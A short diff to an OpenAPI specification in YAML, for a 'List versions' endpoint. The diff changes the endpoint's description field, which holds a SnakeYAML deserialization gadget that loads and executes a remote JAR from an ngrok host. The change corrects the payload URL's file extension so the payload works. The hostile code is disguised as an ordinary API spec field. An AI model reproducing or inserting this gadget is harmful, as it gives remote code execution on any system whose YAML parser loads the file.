@@ -11,7 +11,7 @@ paths:
     get:
       operationId: getVersions-v2
       summary: List versions
-      description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [https://content-kangaroo-mighty.ngrok-free.app/payload1_runtime.jarl]]]]
+      description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [https://content-kangaroo-mighty.ngrok-free.app/payload1_runtime.jar]]]]
       produces:
       - application/json
       responses:
